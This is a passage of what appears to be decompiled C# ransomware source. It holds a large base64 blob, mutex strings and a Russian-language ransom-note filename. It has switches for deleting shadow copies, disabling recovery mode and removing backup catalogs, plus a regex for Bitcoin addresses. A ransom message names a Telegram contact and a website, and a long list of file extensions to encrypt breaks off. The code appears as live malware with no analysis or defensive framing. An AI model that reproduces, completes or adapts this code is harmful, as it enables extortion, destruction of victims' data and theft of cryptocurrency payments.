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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "КАК РАСШИФРОВАТЬ FILES.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[14]
	{
		"Attention! All your files are encrypted!", "To restore your files and access them,", "send an SMS with the text - to the User Telegram @keygroup777huis1", "", "", "You have 1 attempts to enter the code. If this", "amount is exceeded, all data will irreversibly deteriorate. Be", "careful when entering the code!", "", "",
		"Glory @keygroup777/@huis_bn", "", "our website: http://yestimx3.beget.tech/ctd.html", ""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
